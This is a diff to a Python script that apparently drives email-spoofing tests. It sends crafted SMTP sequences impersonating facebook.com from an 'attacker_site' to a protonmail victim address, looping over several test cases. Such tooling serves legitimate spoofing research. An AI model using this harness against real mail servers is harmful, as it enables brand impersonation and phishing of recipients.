@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 from common.common import *
 from common.mailsender import mailsender
 
@@ -6,7 +8,7 @@ import testcases
 config = {
 	"attacker_site": b"owlhut.com",
 	"legitimate_site": b"facebook.com",
-	"victim_address": b"abelyang227@protonmail.com",
+	"victim_address": b"abelyang227+test@protonmail.com",
 	"case_id": b"case_b1",
 }
 
@@ -39,14 +41,18 @@ def build_smtp_seqs(case_id):
 	return cmd_seqs
 
 def main():
-	cmd_seqs = build_smtp_seqs(config["case_id"].decode("utf-8"))
-	mail_server = get_mail_server_from_email(config["victim_address"])
-	mail_sender = mailsender()
-	mail_sender.set_param((mail_server, 25), rcpt_to = cmd_seqs["rcptto"], email_data = cmd_seqs["msg_content"], helo=cmd_seqs["helo"], mail_from= cmd_seqs["mailfrom"], starttls=True)
-	mail_sender.send_email()
+    case_list = ["a4","a7","b1","b2","b3","b4"]
+    for s in case_list:
+	#cmd_seqs = build_smtp_seqs(config["case_id"].decode("utf-8"))
+        print(test_cases["case_"+s]["case_name"].decode("utf-8"))
+        cmd_seqs = build_smtp_seqs("case_"+s)
+        mail_server = get_mail_server_from_email(config["victim_address"])
+        mail_sender = mailsender()
+        mail_sender.set_param((mail_server, 25), rcpt_to = cmd_seqs["rcptto"], email_data = cmd_seqs["msg_content"], helo=cmd_seqs["helo"], mail_from= cmd_seqs["mailfrom"], starttls=True)
+        mail_sender.send_email()
 
 if __name__ == '__main__':
-	main()
+    main()
 
 
 
